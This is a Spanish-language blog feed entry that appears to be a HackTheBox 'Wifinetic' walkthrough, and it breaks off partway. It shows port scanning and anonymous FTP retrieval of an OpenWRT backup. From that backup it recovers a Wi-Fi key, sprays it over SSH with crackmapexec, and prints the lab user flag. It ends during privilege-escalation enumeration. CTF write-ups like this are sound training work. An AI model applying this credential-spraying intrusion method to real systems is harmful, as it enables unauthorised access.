<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-05T18:59:24-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Wifinetic (easy)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html" rel="alternate" type="text/html" title="HackTheBox - Wifinetic (easy)" /><published>2024-06-05T00:00:00-06:00</published><updated>2024-06-05T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/4aaf2ad33bea830079d74497f8e7fefc.png" />
</p>

<ul>
  <li>Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos haciendo un escaneo de puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,53 10.10.11.247 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-05 12:21 CST
Nmap scan report <span class="k">for </span>10.10.11.247
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Si analizamos el escaneo vemos que tenemos puerto el puerto <strong>21</strong> que corresponde al servicio <strong>FTP</strong> el cual podemos conectarnos usando un <code class="language-plaintext highlighter-rouge">Anonymous FTP login</code> ya que esta habilitado además de que nos comparten archivos <code class="language-plaintext highlighter-rouge">pdf, tar y txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ftp 10.10.11.247
Connected to 10.10.11.247.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.247:miguel<span class="o">)</span>: anonymous
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|40843|<span class="o">)</span>
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
<span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
226 Directory send OK.
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; prompt off
Interactive mode off.
ftp&gt; mget <span class="k">*</span>
<span class="nb">local</span>: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode <span class="o">(||</span>|47292|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>MigrateOpenWrt.txt <span class="o">(</span>4434 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>|  4434       25.02 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received <span class="k">in </span>00:00 <span class="o">(</span>48.57 KiB/s<span class="o">)</span>
<span class="nb">local</span>: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|47722|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>ProjectGreatMigration.pdf <span class="o">(</span>2501210 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>|  2442 KiB  649.31 KiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received <span class="k">in </span>00:03 <span class="o">(</span>634.83 KiB/s<span class="o">)</span>
<span class="nb">local</span>: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|49450|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>ProjectOpenWRT.pdf <span class="o">(</span>60857 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 60857      322.21 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received <span class="k">in </span>00:00 <span class="o">(</span>214.25 KiB/s<span class="o">)</span>
<span class="nb">local</span>: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode <span class="o">(||</span>|47415|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>backup-OpenWrt-2023-07-26.tar <span class="o">(</span>40960 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 40960      368.09 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received <span class="k">in </span>00:00 <span class="o">(</span>205.82 KiB/s<span class="o">)</span>
<span class="nb">local</span>: employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|49749|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>employees_wellness.pdf <span class="o">(</span>52946 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 52946      300.96 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received <span class="k">in </span>00:00 <span class="o">(</span>200.50 KiB/s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>En el <strong>.txt</strong> nos hablan sobre <code class="language-plaintext highlighter-rouge">OpenWRT</code> <a href="https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/">https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |          Test and Troubleshoot               |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Test Wifi connectivity and performance    |    |
  |  |   - Verify all services are functioning       |    |
  |  |   - Address and resolve any issues            |    |
  |  |   - Test <span class="k">for </span>security issues with Reaver tool |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Monitor and Maintain                 |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Implement regular updates and patches     |    |
  |  |   - Monitor system health and performance     |    |
  |  |   - Maintain and optimize the Debian system   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  +-------------------------------------------------------+
</code></pre></div></div>

<ul>
  <li>Si analizamos los <code class="language-plaintext highlighter-rouge">PDFs</code> encontramos información.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/1.png" />
</p>

<ul>
  <li>Aquí hablan solo de un proyecto que tienen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/2.png" />
</p>

<ul>
  <li>Aquí nos hablan sobre la migración de <code class="language-plaintext highlighter-rouge">OpenWRT</code> para su red wifi y el <code class="language-plaintext highlighter-rouge">pdf</code> es del administrador de la red Oliver Walker.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/3.png" />
</p>

<ul>
  <li>Pues bueno no encontramos nada interesante vamos analizar el <code class="language-plaintext highlighter-rouge">backup-OpenWrt-2023-07-26.tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap 7z x backup-OpenWrt-2023-07-26.tar

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 40960 bytes <span class="o">(</span>40 KiB<span class="o">)</span>

Extracting archive: backup-OpenWrt-2023-07-26.tar
<span class="nt">--</span>
Path <span class="o">=</span> backup-OpenWrt-2023-07-26.tar
Type <span class="o">=</span> <span class="nb">tar
</span>Physical Size <span class="o">=</span> 40960
Headers Size <span class="o">=</span> 19968
Code Page <span class="o">=</span> UTF-8
Characteristics <span class="o">=</span> GNU ASCII

Everything is Ok

Folders: 7
Files: 27
Size:       13804
Compressed: 40960
</code></pre></div></div>

<ul>
  <li>Dentro del directorio <code class="language-plaintext highlighter-rouge">/etc</code> nos comparten muchos archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc tree
<span class="nb">.</span>
├── config
│   ├── dhcp
│   ├── dropbear
│   ├── firewall
│   ├── luci
│   ├── network
│   ├── rpcd
│   ├── system
│   ├── ucitrack
│   ├── uhttpd
│   └── wireless
├── dropbear
│   ├── dropbear_ed25519_host_key
│   └── dropbear_rsa_host_key
├── group
├── hosts
├── inittab
├── luci-uploads
├── nftables.d
│   ├── 10-custom-filter-chains.nft
│   └── README
├── opkg
│   └── keys
│       └── 4d017e6f1ed5d616
├── passwd
├── profile
├── rc.local
├── shells
├── shinit
├── sysctl.conf
├── uhttpd.crt
└── uhttpd.key

7 directories, 26 files
</code></pre></div></div>

<ul>
  <li>En <code class="language-plaintext highlighter-rouge">wireless</code> encontramos una <code class="language-plaintext highlighter-rouge">key</code> para al parecer un <code class="language-plaintext highlighter-rouge">AP</code> con nombre <code class="language-plaintext highlighter-rouge">wifinet1, wifinet0</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  config <span class="nb">cat </span>wireless

config wifi-device <span class="s1">'radio0'</span>
	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
	option path <span class="s1">'virtual/mac80211_hwsim/hwsim0'</span>
	option cell_density <span class="s1">'0'</span>
	option channel <span class="s1">'auto'</span>
	option band <span class="s1">'2g'</span>
	option txpower <span class="s1">'20'</span>

config wifi-device <span class="s1">'radio1'</span>
	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
	option path <span class="s1">'virtual/mac80211_hwsim/hwsim1'</span>
	option channel <span class="s1">'36'</span>
	option band <span class="s1">'5g'</span>
	option htmode <span class="s1">'HE80'</span>
	option cell_density <span class="s1">'0'</span>

config wifi-iface <span class="s1">'wifinet0'</span>
	option device <span class="s1">'radio0'</span>
	option mode <span class="s1">'ap'</span>
	option ssid <span class="s1">'OpenWrt'</span>
	option encryption <span class="s1">'psk'</span>
	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
	option wps_pushbutton <span class="s1">'1'</span>

config wifi-iface <span class="s1">'wifinet1'</span>
	option device <span class="s1">'radio1'</span>
	option mode <span class="s1">'sta'</span>
	option network <span class="s1">'wwan'</span>
	option ssid <span class="s1">'OpenWrt'</span>
	option encryption <span class="s1">'psk'</span>
	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
</code></pre></div></div>

<ul>
  <li>Aquí encontramos usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc <span class="nb">cat </span>group
root:x:0:
daemon:x:1:
adm:x:4:
mail:x:8:
dialout:x:20:
audio:x:29:
www-data:x:33:
ftp:x:55:
<span class="nb">users</span>:x:100:
network:x:101:network
nogroup:x:65534:
ntp:x:123:ntp
dnsmasq:x:453:dnsmasq
logd:x:514:logd
ubus:x:81:ubus
netadmin:!:999:
</code></pre></div></div>

<ul>
  <li>Como tenemos una contraseña y nombres de varios usuarios hice una lista y con <code class="language-plaintext highlighter-rouge">crackmapexec</code> vi que usuarios usan la contraseña para autenticarse por <code class="language-plaintext highlighter-rouge">ssh</code> y el usuario <code class="language-plaintext highlighter-rouge">netadmin</code> la usa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>users.txt
root
adm
mail
network
ntp
netadmin
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ssh 10.10.11.247 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span> <span class="nt">--continue-on-success</span>
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] adm:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] mail:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>+] netadmin:VeRyUniUqWiFIPasswrd1!
</code></pre></div></div>

<h2 id="shell-as-netadmin-and-usertxt">Shell as netadmin and user.txt</h2>

<ul>
  <li>Ahora nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ssh netadmin@10.10.11.247
The authenticity of host <span class="s1">'10.10.11.247 (10.10.11.247)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.247<span class="s1">' (ED25519) to the list of known hosts.
netadmin@10.10.11.247'</span>s password:
Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-162-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 05 Jun 2024 06:45:43 PM UTC

  System load:            0.04
  Usage of /:             70.1% of 4.76GB
  Memory usage:           12%
  Swap usage:             0%
  Processes:              228
  Users logged <span class="k">in</span>:        0
  IPv4 address <span class="k">for </span>eth0:  10.10.11.247
  IPv6 address <span class="k">for </span>eth0:  dead:beef::250:56ff:feb9:e70f
  IPv4 address <span class="k">for </span>wlan0: 192.168.1.1
  IPv4 address <span class="k">for </span>wlan1: 192.168.1.23


Expanded Security Maintenance <span class="k">for </span>Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: <span class="nb">sudo </span>pro status


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  5 04:48:37 2024 from 10.10.16.6
netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
c1b267d58451fd704217588ece6ae83b
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
</code></pre></div></div>

<ul>
  <li>No tenemos ningún privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>netadmin:
Sorry, user netadmin may not run <span class="nb">sudo </span>on wifinetic.
</code></pre></div></div>

<ul>
  <li>Podemos buscar por <code class="language-plaintext highlighter-rouge">capabilities</code> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a> la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> <a href="https://www.kali.org/tools/reaver/">https://www.kali.org/tools/reaver/</a> <a href="https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html">https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html</a> es utilizada para ataques wifi WPS.</li>
</ul>

<blockquote>
  <p>El protocolo WPS (Wi-Fi Protected Setup) es un estándar de seguridad de redes diseñado para facilitar la configuración segura de una red inalámbrica Wi-Fi. Este protocolo permite a los usuarios conectar dispositivos a una red inalámbrica de forma segura y conveniente sin tener que ingresar una contraseña larga.</p>
</blockquote>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/4.png" />
</p>

<ul>
  <li>Tenemos 6 interfaces.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>ifconfig
eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 fe80::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 00:50:56:b9:e7:0f  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 234991  bytes 14972570 <span class="o">(</span>14.9 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 213051  bytes 19724677 <span class="o">(</span>19.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  <span class="o">(</span>UNSPEC<span class="o">)</span>
        RX packets 598684  bytes 105544453 <span class="o">(</span>105.5 MB<span class="o">)</span>
        RX errors 0  dropped 598623  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:00:00:00:00:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 20246  bytes 1987658 <span class="o">(</span>1.9 MB<span class="o">)</span>
        RX errors 0  dropped 2743  overruns 0  frame 0
        TX packets 23375  bytes 2791153 <span class="o">(</span>2.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:00:00:00:01:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 5862  bytes 815386 <span class="o">(</span>815.3 KB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20223  bytes 2348428 <span class="o">(</span>2.3 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<ul>
  <li>
    <p>La que mas llama la atención es <code class="language-plaintext highlighter-rouge">mon0</code> ya que cuando tenemos una antena y la ponemos en modo monitor suele llamarse <code class="language-plaintext highlighter-rouge">wlan0mon</code>.</p>
  </li>
  <li>
    <p>Algo que podemos hacer es ver mas información acerca de las interfaces inalámbricas en el sistema.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		<span class="nb">type </span>monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		<span class="nb">type </span>managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		<span class="nb">type </span>P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		<span class="nb">type </span>managed
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		<span class="nb">type </span>AP
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que wlan0 tiene como nombre su <code class="language-plaintext highlighter-rouge">AP</code> <code class="language-plaintext highlighter-rouge">OpenWRT</code> que opera en el canal 1.</p>
  </li>
  <li>
    <p>Este es mas interesante ya que esta corriendo en modo <code class="language-plaintext highlighter-rouge">managed</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		<span class="nb">type </span>P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		<span class="nb">type </span>managed
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
</code></pre></div></div>

<blockquote>
  <p>type managed: La interfaz está en modo “managed”, también conocido como modo “infraestructura”. Este modo es utilizado en dispositivos clientes que se conectan a un punto de acceso central (como un router). El dispositivo en este modo se comunica a través de un punto de acceso.</p>
</blockquote>

<blockquote>
  <p>El “modo managed” es un tipo de configuración de red inalámbrica en la que la interfaz inalámbrica del dispositivo opera como un cliente dentro de una infraestructura de red WLAN más grande. Este es el modo típico utilizado por los dispositivos que se conectan a un router Wi-Fi. En este modo, todas las decisiones sobre cuándo y cómo transmitir datos a través de la red son administradas por el punto de acceso, y no por la interfaz inalámbrica del cliente.</p>
</blockquote>

<ul>
  <li>
